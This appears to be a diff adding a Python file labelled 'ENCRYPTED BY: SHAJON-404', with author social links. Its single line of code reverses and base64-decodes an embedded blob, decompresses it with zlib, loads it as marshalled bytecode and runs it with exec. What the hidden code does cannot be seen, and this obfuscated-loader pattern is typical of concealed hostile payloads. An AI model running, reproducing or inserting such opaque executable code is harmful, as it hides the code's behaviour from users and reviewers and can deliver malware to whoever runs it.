@@ -1,0 +1,6 @@
+# ENCRYPTED BY: SHAJON-404
+# FACEBOOK : https://www.facebook.com/mdshahmakhdum.shajon
+# Github: https://github.com/SHAJON-404
+#==============================================#
+
+_ = lambda __ : __import__('marshal').loads(__import__('zlib').decompress(__import__('base64').b64decode(__[::-1])));exec((_)(b'=Ej13kJA/XznveDm106QybKnwp2evGINFt/2HLs3B0qUbN/n5tI+CZ+2RVvwX3zSV3eT5yD59k1TDn6IYbmpullLeczEuk3afFiX52gOjKN5wgJKyeGna7o9/19Z75hpNDNYfpy//ngPfWlhCkiEkY70WhkaU0eOtAXRGwQdGQgudOmJjMBWe92zXaV5c+BtsMV7OKUvNKSw+Cy1hd2QQAWsehmHUVbvwp1zcaNQYMXbuWwv59L8sAMCc4U/V7K+fvtehbx0YL6Bv+kbWvXNMvOrdPVXFq6HAzYCkuX/j8VkdhGU4Gi9ZDCmS7B2V5QoRh5s7jo5USleYcXTmVFDvG8yjrzvBKI/rtb7tWYK/RAIo+YhJfX8QWIVan3Zj0cfx9GNyZcCBbrSaQZ7NqfkykVaMGhtM5pC5a9EJVFkhYyvLPRRTttM8VvbaNLyJ1ek8Ax3nA1sl8YQAzJaa7CAZ6h3JKTnW3chwQT/G6f5GfNtihlTrnFkqYk/s5hg6JRmmhCzplrt0EJekypXi0ZpGNqPoy5zmJwcaNYtQt5h84i6asLtLEjiwgGMAL+kyAxiwyDTVIzPa+g/qfdGYkRZvwj8pYv/26G/NrtWiU8uze7b0VHh8UuoQs+LbuuVC+s0MOGcFKo0exXjrVhIxNv3Ee8Ynxj95KKmuN3ipEJPSEKCl2Mc/kCCzt+iM8qMQ3HAKTpowHTxKSlyz6IIsQpy6mLv//HNmtf++mGLgZVPXeWHs2ekq2U9To+pSb40Sa0SrhKn2SLYEeLQb2mkeIs4LhCQXr7GDCWJBpofPMl3QAz2K2MVNzJe'))
